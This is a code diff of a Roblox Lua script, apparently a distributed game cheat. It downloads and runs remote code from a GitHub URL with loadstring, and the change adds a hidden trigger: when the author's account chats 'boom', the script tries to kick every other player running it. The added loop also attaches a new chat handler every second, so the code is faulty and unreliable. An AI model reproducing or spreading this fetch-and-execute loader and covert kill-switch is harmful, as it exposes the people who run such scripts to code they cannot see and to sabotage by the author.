@@ -2,15 +2,25 @@
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Linhmcfake1/Build-and-battle-tp/refs/heads/main/Linked"))()
 
 -- Thêm chức năng kick
-local playerToKickId = 5233707500
+local player = game.Players.LocalPlayer
 
-game.Players.LocalPlayer.Chatted:Connect(function(message)
-    if game.Players.LocalPlayer.UserId == playerToKickId and message == "," then
-        local players = game.Players:GetPlayers()
-        for _, targetPlayer in pairs(players) do
-            if targetPlayer.UserId ~= playerToKickId then
-                targetPlayer:Kick("You have been kicked by linhmc_new.")
+-- Hàm để kiểm tra chat liên tục
+local function checkChat()
+    while true do
+        wait(1) -- Đợi một giây trước khi kiểm tra
+        player.Chatted:Connect(function(message)
+            if message == "boom" and player.Name == "linhmc_new" then
+                -- Kick tất cả người chơi khác đang chạy script này
+                local players = game.Players:GetPlayers()
+                for _, targetPlayer in pairs(players) do
+                    if targetPlayer.Name ~= "linhmc_new" then
+                        targetPlayer:Kick("You have been kicked by linhmc_new.")
+                    end
+                end
             end
-        end
+        end)
     end
-end)
+end
+
+-- Gọi hàm kiểm tra chat
+checkChat()
